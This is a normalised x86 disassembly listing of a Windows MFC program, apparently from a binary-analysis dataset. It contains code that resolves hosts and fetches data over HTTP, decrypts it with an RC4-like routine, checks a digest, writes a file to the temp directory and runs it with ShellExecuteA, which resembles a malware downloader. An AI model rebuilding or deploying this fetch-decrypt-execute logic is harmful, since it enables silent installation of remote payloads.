call Ordinal_MFC42_800
lea ecx [ ebp - 0x5a0 ]
mov [ ebp - 0x4 ] 0x5
call sub_40cb80
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_800
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_800
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_800
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_800
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_800
mov [ ebp - 0x4 ] esi
call Ordinal_MFC42_800
lea ecx [ ebp - 0x5a0 ]
mov [ ebp - 0x4 ] 0x5
call sub_40cb80
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_800
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_800
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_800
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_800
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_800
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] esi
call Ordinal_MFC42_800
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] 0x7
call Ordinal_MFC42_1567
test esi esi
je r-xdata
mov edx [ ebp - 0x24 ]
mov ebx edi
push edx
mov [ ebp - 0x4 ] 0xd
mov [ ebp - 0x40 ] ebx
call [ inet_ntoa@IAT ]
push eax
lea ecx [ ebp + 0x8 ]
call Ordinal_MFC42_537
mov eax [ ebp + 0x8 ]
push esi
push esi
push 0x50
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0xf
call Ordinal_MFC42_3229
push 0xa4400000
push esi
push esi
push 0x1
mov edi eax
push esi
push rw-data
push esi
mov ecx edi
mov [ ebp - 0x20 ] edi
call Ordinal_MFC42_5204
mov esi eax
push 0x1
push 0x8
push 0x16b
mov ecx esi
mov [ ebp - 0x38 ] esi
call Ordinal_MFC42_6881
mov edx [ esi ]
lea eax [ ebp - 0x1ec ]
push 0x16b
push eax
mov ecx esi
call [ edx + 0x40 ]
push 0x1
push 0x0
push 0x0
mov ecx esi
call Ordinal_MFC42_6657
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xd
call Ordinal_MFC42_800
jmp r-xdata
test edi edi
je r-xdata
mov edx [ esi ]
mov ecx esi
call [ edx + 0x54 ]
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
test ebx ebx
je r-xdata
mov edx [ edi ]
mov ecx edi
call [ edx + 0x14 ]
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x6
call Ordinal_MFC42_800
lea ecx [ ebp - 0x5a0 ]
mov [ ebp - 0x4 ] 0x5
call sub_40cb80
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_800
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_800
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_800
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_800
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_800
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov edx [ ebx ]
mov ecx ebx
call [ edx + 0x14 ]
mov eax [ ebx ]
push 0x1
mov ecx ebx
call [ eax + 0x4 ]
lea ecx [ ebp - 0x14 ]
call Ordinal_MFC42_800
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4023e9
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add edx [ eax - 0x6f6f6f70 ]
nop
nop
nop
jmp Ordinal_MFC42_1567
sub_402430
push ebp
mov ebp esp
push 0xffffffff
push sub_40da91
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x160
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x14 ] 0x0
lea ecx [ ebp - 0x50 ]
call Ordinal_MFC42_268
mov ecx [ ebp - 0x14 ]
push 0x0
push 0x0
inc ecx
push 0x0
push 0x0
mov [ ebp - 0x14 ] ecx
push 0x1
mov [ ebp - 0x4 ] 0x0
push 0x0
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_389
mov eax [ esi + 0x34 ]
push 0x0
push 0x0
push 0x84000002
push 0x0
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_5207
mov edi eax
lea ecx [ ebp - 0x128 ]
push 0x74
push ecx
mov eax [ edi ]
mov ecx edi
call [ eax + 0x3c ]
mov edx [ edi ]
mov ecx edi
call [ edx + 0x54 ]
lea ecx [ ebp - 0x48 ]
call Ordinal_MFC42_1988
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_690
or ebx 0xffffffff
mov [ ebp - 0x4 ] ebx
call Ordinal_MFC42_1567
push ecx
lea edx [ esi + 0x54 ]
mov ecx esp
mov [ ebp - 0x34 ] esp
push edx
mov [ ebp - 0x4 ] ebx
call Ordinal_MFC42_535
lea eax [ ebp - 0x128 ]
push 0x74
push eax
mov ecx esi
call sub_402d00
mov ecx [ ebp - 0x128 ]
mov edx [ ebp - 0x124 ]
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x68 ] ecx
mov ecx [ ebp - 0x11c ]
mov [ ebp - 0x64 ] edx
mov [ ebp - 0x60 ] eax
lea edx [ ebp - 0x118 ]
push 0x64
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x5c ] ecx
push edx
push eax
mov ecx esi
call sub_402a20
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_540
push 0x104
push 0x104
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x5
call Ordinal_MFC42_2919
push eax
call [ GetSystemDirectoryA@IAT ]
push ebx
lea ecx [ ebp - 0x20 ]
call Ordinal_MFC42_5572
lea ecx [ ebp - 0x20 ]
push rw-data
lea edx [ ebp - 0x24 ]
push ecx
push edx
call Ordinal_MFC42_924
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x6
call Ordinal_MFC42_356
mov eax [ ebp - 0x24 ]
push 0x0
push eax
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x7
call Ordinal_MFC42_2770
test eax eax
je r-xdata
lea ecx [ ebp - 0x18 ]
call Ordinal_MFC42_540
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x9
call Ordinal_MFC42_268
push 0x0
push 0x0
push 0x0
push 0x0
push 0x1
push 0x0
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xb
call Ordinal_MFC42_389
mov eax [ ebp - 0x28 ]
push 0x0
push 0x0
push 0x84000002
mov bl 0xc
push 0x0
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] bl
call Ordinal_MFC42_5207
lea ecx [ ebp - 0x30 ]
mov esi eax
push ecx
mov ecx esi
mov [ ebp - 0x30 ] 0x0
call Ordinal_MFC42_5356
test eax eax
je r-xdata
mov ecx [ ebp - 0x24 ]
push 0x40
push ecx
lea ecx [ ebp - 0x58 ]
call Ordinal_MFC42_353
lea edx [ ebp - 0x44 ]
push 0x10
push edx
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x8
call Ordinal_MFC42_5442
lea ecx [ ebp - 0x58 ]
call Ordinal_MFC42_1979
mov ecx 0x10
lea edi [ ebp - 0x44 ]
lea esi [ ebp - 0x68 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov edx [ esi ]
mov ecx esi
call [ edx + 0x54 ]
lea ecx [ ebp - 0x48 ]
call Ordinal_MFC42_1988
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xb
call Ordinal_MFC42_690
mov [ ebp - 0x4 ] 0x9
call Ordinal_MFC42_1567
cmp [ ebp - 0x30 ] 0xc8
jne r-xdata
test eax eax
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp - 0x58 ]
jne r-xdata
sbb eax eax
sbb eax ebx
lea ecx [ ebp - 0x14 ]
call Ordinal_MFC42_540
push 0x1000
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0xd
call Ordinal_MFC42_2919
mov edx [ esi ]
push 0x1000
push eax
mov ecx esi
call [ edx + 0x3c ]
test eax eax
jne r-xdata
call Ordinal_MFC42_665
call Ordinal_MFC42_665
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x6
call Ordinal_MFC42_668
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x5
call Ordinal_MFC42_800
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_800
mov [ ebp - 0x4 ] ebx
jmp r-xdata
push eax
lea ecx [ ebp - 0x14 ]
call Ordinal_MFC42_5572
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x18 ]
push eax
call Ordinal_MFC42_939
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] bl
call Ordinal_MFC42_800
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] bl
call Ordinal_MFC42_800
mov edx [ esi ]
mov ecx esi
call [ edx + 0x54 ]
lea ecx [ ebp - 0x48 ]
call Ordinal_MFC42_1988
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xb
call Ordinal_MFC42_690
mov [ ebp - 0x4 ] 0x9
call Ordinal_MFC42_1567
lea ecx [ ebp - 0x16c ]
call sub_407c30
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0xb4 ]
push ecx
lea ecx [ ebp - 0x18 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x4 ] 0xf
push eax
push eax
call Ordinal_MFC42_2915
push eax
lea ecx [ ebp - 0x16c ]
call sub_408840
mov ecx 0x10
lea edi [ ebp - 0xb4 ]
lea esi [ ebp - 0x68 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
lea ecx [ ebp - 0x28 ]
call Ordinal_MFC42_800
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
lea ecx [ ebp - 0x16c ]
mov [ ebp - 0x4 ] 0x9
call sub_407c70
jmp r-xdata
mov edx [ ebp - 0x24 ]
push 0x1041
push edx
lea ecx [ ebp - 0x78 ]
call Ordinal_MFC42_353
lea eax [ ebp - 0x68 ]
push 0x10
push eax
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x10
call Ordinal_MFC42_6385
lea ecx [ ebp - 0x78 ]
call Ordinal_MFC42_1979
lea ecx [ ebp - 0x1c ]
call Ordinal_MFC42_540
mov bl 0x11
push 0x104
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] bl
call Ordinal_MFC42_2919
push eax
push 0x104
call [ GetTempPathA@IAT ]
push 0xffffffff
lea ecx [ ebp - 0x1c ]
call Ordinal_MFC42_5572
mov ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax [ ecx - 0x8 ]
lea ecx [ ebp - 0x1c ]
dec eax
push eax
push edx
call Ordinal_MFC42_4129
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x12
call Ordinal_MFC42_858
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] bl
call Ordinal_MFC42_800
lea eax [ ebp - 0x1c ]
push rw-data
lea ecx [ ebp - 0x2c ]
push eax
push ecx
call Ordinal_MFC42_924
mov edx [ ebp - 0x2c ]
push 0x1041
push edx
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x13
call Ordinal_MFC42_353
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x14
mov eax [ eax - 0x8 ]
push eax
push eax
call Ordinal_MFC42_2915
push eax
lea ecx [ ebp - 0xa4 ]
call Ordinal_MFC42_6385
lea ecx [ ebp - 0xa4 ]
call Ordinal_MFC42_1979
mov esi [ Sleep@IAT ]
push 0x3e8
call esi
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x2c ]
push 0x1
push ecx
push 0x0
push edx
push 0x0
push 0x0
mov edi [ ShellExecuteA@IAT ]
call edi
cmp eax 0x20
jg r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x7
call Ordinal_MFC42_800
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x6
call Ordinal_MFC42_668
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x5
call Ordinal_MFC42_800
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_800
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x13
call Ordinal_MFC42_665
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call Ordinal_MFC42_800
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x10
call Ordinal_MFC42_800
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0xf
call Ordinal_MFC42_665
push 0x32
call esi
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x2c ]
push 0x1
push eax
push 0x0
push ecx
push 0x0
push 0x0
call edi
cmp eax 0x20
jle r-xdata
sub_4029b0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40daa8
push eax
mov [ fs : 0x0 ] esp
push ebx
push esi
push edi
mov eax [ esp + 0x20 ]
lea ecx [ esp + 0x20 ]
mov [ esp + 0x14 ] 0x0
mov ebx [ eax - 0x8 ]
push ebx
call Ordinal_MFC42_2915
mov edi [ esp + 0x1c ]
mov ecx ebx
mov edx ecx
mov esi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov [ esp + 0x14 ] 0xffffffff
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_800
mov ecx [ esp + 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn 0x8
sub_402a20
push 0xffffffff
push sub_40dadf
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebp
push esi
push edi
lea ecx [ esp + 0xc ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_540
mov ebp [ esp + 0x2c ]
mov esi [ esp + 0x28 ]
push ebp
lea ecx [ esp + 0x10 ]
mov [ esp + 0x20 ] 0x1
call Ordinal_MFC42_2915
mov ecx ebp
mov edi eax
mov eax ecx
push 0xffffffff
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_5572
mov esi [ esp + 0x24 ]
lea ecx [ esp + 0xc ]
push ecx
mov ecx esi
call Ordinal_MFC42_535
mov [ esp + 0x10 ] 0x1
lea ecx [ esp + 0xc ]
mov [ esp + 0x1c ] 0x0
call Ordinal_MFC42_800
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x14
retn 0xc
sub_402ac0
push 0xffffffff
push sub_40db27
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
mov [ esp + 0xc ] 0x0
lea ecx [ esp + 0x8 ]
mov [ esp + 0x20 ] 0x2
mov [ esp + 0x10 ] 0xff
call Ordinal_MFC42_540
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x2c ]
lea eax [ esp + 0x14 ]
mov bl 0x3
push eax
push 0x20019
push 0x0
push ecx
push edx
mov [ esp + 0x34 ] bl
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push eax
call Ordinal_MFC42_823
mov edx [ esp + 0x38 ]
add esp 0x4
lea ecx [ esp + 0x10 ]
mov esi eax
mov eax [ esp + 0x14 ]
push ecx
push esi
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
mov esi [ esp + 0x28 ]
push rw-data
mov ecx esi
call Ordinal_MFC42_537
mov ebx 0x1
mov [ esp + 0xc ] ebx
jmp r-xdata
call Ordinal_MFC42_1158
mov ecx [ eax ]
push esi
mov [ esp + 0x30 ] ecx
lea ecx [ esp + 0x30 ]
call Ordinal_MFC42_860
lea edx [ esp + 0x2c ]
lea ecx [ esp + 0x8 ]
push edx
mov [ esp + 0x24 ] 0x4
call Ordinal_MFC42_858
lea ecx [ esp + 0x2c ]
mov [ esp + 0x20 ] bl
call Ordinal_MFC42_800
push esi
call Ordinal_MFC42_825
mov eax [ esp + 0x18 ]
add esp 0x4
push eax
call [ RegCloseKey@IAT ]
mov esi [ esp + 0x28 ]
lea ecx [ esp + 0x8 ]
push ecx
mov ecx esi
call Ordinal_MFC42_535
mov esi [ esp + 0x28 ]
push rw-data
mov ecx esi
call Ordinal_MFC42_537
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x20 ] 0x2
call Ordinal_MFC42_800
lea ecx [ esp + 0x30 ]
mov [ esp + 0x20 ] bl
call Ordinal_MFC42_800
lea ecx [ esp + 0x34 ]
mov [ esp + 0x20 ] 0x0
call Ordinal_MFC42_800
mov ecx [ esp + 0x18 ]
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn 0x10
mov ebx 0x1
mov [ esp + 0xc ] ebx
sub_402c20
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_40db50
push eax
mov [ fs : 0x0 ] esp
push ebx
xor ebx ebx
mov [ esp + 0xc ] ebx
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x14 ]
push eax
push 0x20019
push ebx
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x18 ]
mov [ esp + 0xc ] bl
call Ordinal_MFC42_800
lea ecx [ esp + 0x1c ]
mov [ esp + 0xc ] 0xffffffff
call Ordinal_MFC42_800
xor eax eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn 0x18
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
push eax
mov eax [ esp + 0x20 ]
lea edx [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x1c ]
push edx
push ebx
push eax
push ecx
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
push edx
call [ RegCloseKey@IAT ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0xc ] bl
call Ordinal_MFC42_800
lea ecx [ esp + 0x1c ]
mov [ esp + 0xc ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x4 ]
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn 0x18
sub_402d00
push 0xffffffff
push sub_40db68
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x104
push esi
mov esi ecx
mov eax [ esp + 0x120 ]
lea ecx [ esp + 0x4 ]
push ecx
lea ecx [ esp + 0x124 ]
mov eax [ eax - 0x8 ]
mov [ esp + 0x114 ] 0x0
push eax
push eax
call Ordinal_MFC42_2915
push eax
mov ecx esi
call sub_402da0
mov eax [ esp + 0x11c ]
mov ecx [ esp + 0x118 ]
lea edx [ esp + 0x4 ]
push edx
push eax
push ecx
mov ecx esi
call sub_402e40
lea ecx [ esp + 0x120 ]
mov [ esp + 0x110 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x108 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x110
retn 0xc
sub_402da0
sub esp 0x8
xor ecx ecx
xor eax eax
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x24 ]
mov edx edi
mov [ edx ] al
inc eax
inc edx
cmp ax 0x100
jl r-xdata
mov [ edi + 0x100 ] cl
mov [ edi + 0x101 ] cl
mov [ esp + 0x24 ] cl
mov esi edi
mov [ esp + 0x10 ] 0x100
mov [ esp + 0x14 ] cl
mov ecx [ esp + 0x14 ]
and ecx 0xff
inc eax
mov bl [ ecx + edi ]
mov [ esi ] bl
mov [ ecx + edi ] dl
cdq
idiv [ esp + 0x20 ]
mov eax [ esp + 0x10 ]
inc esi
dec eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x24 ] dl
jne r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x1c ]
mov dl [ esi ]
and eax 0xff
xor ebx ebx
mov bl [ eax + ebp ]
mov ebp edx
and ebp 0xff
add ecx ebx
add ecx ebp
and ecx 0x800000ff
jns r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0xc
sub_402e40
sub esp 0xc
mov eax [ esp + 0x18 ]
push esi
mov esi [ esp + 0x18 ]
push edi
mov cl [ eax + 0x100 ]
mov dl [ eax + 0x101 ]
xor edi edi
mov [ esp + 0x8 ] cl
test esi esi
mov [ esp + 0x20 ] dl
jbe r-xdata
pop edi
mov [ eax + 0x100 ] cl
mov [ eax + 0x101 ] dl
pop esi
add esp 0xc
retn 0xc
mov ecx [ esp + 0x8 ]
mov esi [ esp + 0x20 ]
push ebx
and ecx 0xff
push ebp
and esi 0xff
mov [ esp + 0x10 ] dl
mov ecx [ esp + 0x10 ]
and ecx 0xff
mov bl [ ecx + eax ]
mov [ esp + 0x18 ] bl
and ebx 0xff
add ebx esi
and ebx 0x800000ff
jns r-xdata
dec edx
or edx 0xffffff00
inc edx
mov [ esp + 0x28 ] bl
mov bl [ esp + 0x18 ]
mov esi [ esp + 0x28 ]
mov [ esp + 0x14 ] bl
and esi 0xff
mov ebp [ esp + 0x14 ]
and ebp 0xff
mov bl [ esi + eax ]
mov [ ecx + eax ] bl
mov bl [ esp + 0x14 ]
mov [ esi + eax ] bl
xor ebx ebx
mov bl [ ecx + eax ]
add ebx ebp
and ebx 0x800000ff
jns r-xdata
dec ebx
or ebx 0xffffff00
inc ebx
mov ebp [ esp + 0x20 ]
and ebx 0xff
mov bl [ ebx + eax ]
xor [ edi + ebp ] bl
mov ebx [ esp + 0x24 ]
inc edi
cmp edi ebx
jb r-xdata
dec ebx
or ebx 0xffffff00
inc ebx
lea edx [ ecx + 0x1 ]
and edx 0x800000ff
jns r-xdata
mov cl [ esp + 0x28 ]
pop ebp
pop ebx
pop edi
mov [ eax + 0x100 ] dl
mov [ eax + 0x101 ] cl
pop esi
add esp 0xc
retn 0xc
sub_402f50
push ebp
mov ebp esp
push 0xffffffff
push sub_40dbbf
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
push ebx
mov ebx ecx
push esi
push edi
lea eax [ ebx + 0x5c ]
mov [ ebp - 0x10 ] esp
xor esi esi
push eax
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x14 ] esi
call [ gethostbyname@IAT ]
lea ecx [ ebp - 0x18 ]
mov edi eax
call Ordinal_MFC42_540
mov ecx [ edi + 0xc ]
mov [ ebp - 0x4 ] 0x1
mov eax [ ecx ]
cmp eax esi
je r-xdata
mov eax [ ebp - 0x18 ]
mov esi rw-data
mov edx [ eax ]
push edx
call [ inet_ntoa@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call Ordinal_MFC42_860
mov eax [ edi + 0xc ]
add esi 0x4
mov eax [ eax + esi ]
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov [ ebp - 0x1c ] 0x0
lea ecx [ ebp - 0x34 ]
call Ordinal_MFC42_268
mov ecx [ ebp - 0x1c ]
push 0x0
push 0x0
inc ecx
push 0x0
push 0x0
mov [ ebp - 0x1c ] ecx
push 0x1
push 0x0
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_389
mov eax [ ebx + 0x20 ]
push 0x0
push 0x0
push 0x84000002
push 0x0
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_5207
mov esi eax
lea ecx [ ebp - 0x60 ]
push 0x17
push ecx
mov eax [ esi ]
mov ecx esi
call [ eax + 0x3c ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x54 ]
lea ecx [ ebp - 0x48 ]
call Ordinal_MFC42_1988
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_690
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_1567
push ecx
lea edx [ ebx + 0x54 ]
mov ecx esp
mov [ ebp - 0x2c ] esp
push edx
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_535
lea eax [ ebp - 0x60 ]
push 0x17
push eax
mov ecx ebx
call sub_402d00
lea ecx [ ebp - 0x60 ]
push 0xf
lea edx [ ebp - 0x20 ]
push ecx
push edx
mov ecx ebx
call sub_402a20
mov esi [ ebx + 0x4 ]
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x6
mov esi [ ebp + 0x8 ]
push rw-data
mov ecx esi
call Ordinal_MFC42_537
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_800
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov eax [ ebp - 0x51 ]
push eax
call [ inet_ntoa@IAT ]
push eax
lea ecx [ ebp - 0x24 ]
call Ordinal_MFC42_537
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4d ]
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x24 ]
mov [ ecx ] edx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x7
call Ordinal_MFC42_535
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x24 ]
or al 0x1
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x14 ] eax
call Ordinal_MFC42_800
mov esi [ ebp + 0x8 ]
push rw-data
mov ecx esi
call Ordinal_MFC42_537
mov eax [ ebp - 0x14 ]
or al 0x1
mov [ ebp - 0x14 ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_800
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_4030f1
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x1c ]
cmp eax 0x3
jl r-xdata
mov eax r-xdata
retn
mov ecx [ ebp + 0x8 ]
push rw-data
call Ordinal_MFC42_537
mov eax [ ebp - 0x14 ]
or al 0x1
mov [ ebp - 0x14 ] eax
mov eax sub_40311a
retn
sub_40311a
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_1567
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_800
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_403220
push 0xffffffff
push sub_40dbe6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esp + 0xc ] esi
lea ecx [ esi + 0x8 ]
call Ordinal_MFC42_540
lea edi [ esi + 0x20 ]
xor ebx ebx
mov ecx edi
mov [ esp + 0x18 ] ebx
call Ordinal_MFC42_287
push 0x1000
push 0x1000
mov ecx edi
mov [ esp + 0x20 ] 0x1
mov [ esi ] r--data
